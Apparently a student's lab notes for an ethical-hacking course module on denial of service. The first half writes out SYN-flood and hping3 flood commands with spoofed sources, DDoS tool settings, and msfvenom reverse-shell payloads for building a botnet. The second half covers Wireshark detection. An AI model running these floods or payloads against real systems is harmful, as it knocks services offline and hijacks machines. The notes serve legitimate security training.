# Module 10

## Denial of Service
DoS and DDoS attacks exploit vulnerabilities in the implementation of TCP/IP model protocol or bugs in a specific OS.

<img width="893" height="257" alt="image" src="https://github.com/user-attachments/assets/7fa5619c-c90c-4b3d-90ad-56143fc6fee8" />
<img width="768" height="259" alt="image" src="https://github.com/user-attachments/assets/e76dfae2-45b0-458f-9ab4-1db6925c83dd" />
<img width="768" height="230" alt="image" src="https://github.com/user-attachments/assets/e44eeaa4-7406-4262-b2fc-b88e4741b644" />

---

### 1. Perform DOS and DDOS with various techniques
As an expert ethical hacker or pen tester, you must have the required knowledge to perform DoS and DDoS attacks to be able to test systems in the target network.

#### 1.1 Perform DOS (syn flooding) using Metasploit
- `use auxillary/dos/tcp/synflood`
- `set RHOST 192.168.18.110`
- `set RPORT 21`
- `set SHOST 192.168.18.1`    \\Spoofed IP
- `exploit`

#### 1.2 Perform DOS attack using HPing3
- `hping3 -S 192.168.18.110 -a 192.168.18.1 -p 22 --flood`
  - `-S` sets the syn flag
  - `-a` spoof the address
  - `--flood`  sends a large no of packets

**Ping of death**
- `hping3 -d 65538 -S -p 22 --flood 192.168.18.110`
  - `-d` sets the data size

#### 1.3 Perform a DOS attack using Rven-Storm
[GitHub - Tmpertor/Raven-Storm: Raven-Storm is a powerful DDoS toolkit for penetration tests, including attacks for several protocols written in python. Takedown many connections using several exotic and classic protocols.](https://github.com/Tmpertor/Raven-Storm)
- `sudo rst`
- `l4`
- `ip 192.168.18.110`
- `port 8080`
- `threads 20000`
- `run`

#### 1.4 Perform DDOS using HOIC
<img width="768" height="340" alt="image" src="https://github.com/user-attachments/assets/7b065862-bfd2-48b6-ae7b-49583312195f" />

#### 1.5 Perform DDOS using LOIC
<img width="768" height="404" alt="image" src="https://github.com/user-attachments/assets/feb9b588-eac4-42ac-8bab-450fd42d5546" />

#### 1.6 Perform a DDoS Attack using ISB and UltraDDOS-v2

**ISB Tool**    
[ISB](https://sourceforge.net/projects/isb/)

**Steps**:
1. One the ISB tool, ISB window appears, using this tool we can perform various attacks such as HTTP Flood, UDP Flood, TCP Flood, TCP Port Scan, ICMP Flood, and Slowloris. Additionally, we can gather Target Info using the WHOIS, NS, TRACEROUTE, BROWSER, PING options present in the tool.
2. Here, we will perform TCP Flood attack on the target Windows Server 2019 machine. To do so, enter the IP address of the Windows Server 2019 in the URL: field (here, 10.10.1.19), port number (here, 80) in the Port: field and click on Set Target.
3. The IP address of Windows Server 2019 along with the port number appears in the Set: field.
4. Now, under Attacks navigate to TCP Flood tab and type 10 in the Interval field, 256 in the Buffer field and 1000 in the Threads field.
5. Leave the ISB window running and click Windows Server 2022 to switch to the Window Server 2022 machine.    
    
**Ultra DDOS tool**    
[UltraDDOS-v2](https://sourceforge.net/projects/ultraddos/)

**Steps**:
1. Run ultraddos.exe file.
2. A Command Prompt window appears, in the Ultra DDOS v2 window, click OK.
3. In the Ultra DDOS v2 window, click on DDOS Attack button.
4. In the Please enter your target. This is the website or IP address that you want to attack. field, type 10.10.1.19 (IP address of Windows Server 2019 machine) and click OK.
5. In the Please enter a port. 80 is most commonly used, but you can use any other valid port. field, enter 80 and click OK.
6. In the Please enter the number of packets you would like to send. More is better, but too many will crash your computer. field, type 1000000 and click on OK.
7. In the Please enter the number of threads you would like to send. This can be the same number as the packets. field, type 1000000 and click on OK.
8. In the The attack will start once you press OK. It will keep going until all requested packets are sent. pop-up window, click OK.
9. As soon as you click on OK the tool starts DoS attack on the Windows Server 2019 machine.
10. Click Windows 11 to switch to the Windows 11 machine, and in the ISB window click on Start Attack button.
> You can open the resource monitor to view that resources are being exhausted.

#### 1.7 Perform a DDoS Attack using Botnet
- Create a metasploit exploit.
  - `msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=6969 -f exe > exploit1.exe`
- Similarly make exploits fir each of your bot.
- Now, you can directly run multihandle, running the following command.
  - `msfconsole -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 10.10.1.13; set lport 6969; run"`
- Now, you can upload scripts to exploited targets.
- [GitHub - WH1T3-E4GL3/eagle-dos: light weight dos attack tool to attack to a single port to any network.s](https://github.com/WH1T3-E4GL3/eagle-dos)
- Now, you can run the script from all your bots.
- Run the DDoS file using command python eagle-dos.py on windows shell terminal. It will ask for Target's IP, type 10.10.1.9 and hit enter.

---

### 2. Detect and Protect DOS and DDOS attacks

#### 2.1 Detect and Protect DDOS attacks using Anti DDOS Guardian
[Anti DDoS Software Free Downloads - BeeThink Anti DDoS Solution](https://www.anti-ddos.net/)

#### 2.2 Detect DDOS with Wireshark
You can detect a DOS attack by simply viewing a pcap file, a large no of packets from a source within a short span of time indicate a DOS attack. A big giveaway is a large number of SYN packets being sent to our Windows 10 PC. We are able to note the start of the attack by a huge flood of TCP traffic. If there is a huge discrepancy between the results of the bottom 2 display filters, we have syn flood attack.    

- To find DOS (SYN and ACK)    
tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0        

- Moreover, If we use the following display filter to display syn/ack packets there will be a huge discrepancy between them:
tcp.flags.syn == 1 and tcp.flags.ack == 1    

- We can also view Wireshark’s graphs for a visual representation of the uptick in traffic. The I/O graph can be found via the Statistics>I/O Graph menu. It shows a massive spike in overall packets from near 0 to up to 2400 packets a second.    
<img width="514" height="253" alt="image" src="https://github.com/user-attachments/assets/5c2ce1c2-341d-42e7-9720-772d20b9c76e" />

- Go to statistics and select conversations. If there are a number of packets targeted on one IP and no reply pack, it indicates DDOS. You can also check the TCP tab
<img width="650" height="337" alt="image" src="https://github.com/user-attachments/assets/1a6fd122-bb50-48ca-b406-97a89ddda802" />    
[Wireshark Cheat Sheet - Commands, Captures, Filters, Shortcuts & FAQs](https://www.comparitech.com/net-admin/wireshark-cheat-sheet/)    

- You can also use other DoS and DDoS protection tools such as, DOSarrest’s DDoS protection service (https://www.dosarrest.com), DDoS-GUARD (https://ddos-guard.net), Radware DefensePro X (https://www.radware.com), F5 DDoS Attack Protection (https://www.f5.com) to protect organization’s systems and networks from DoS and DDoS attacks.




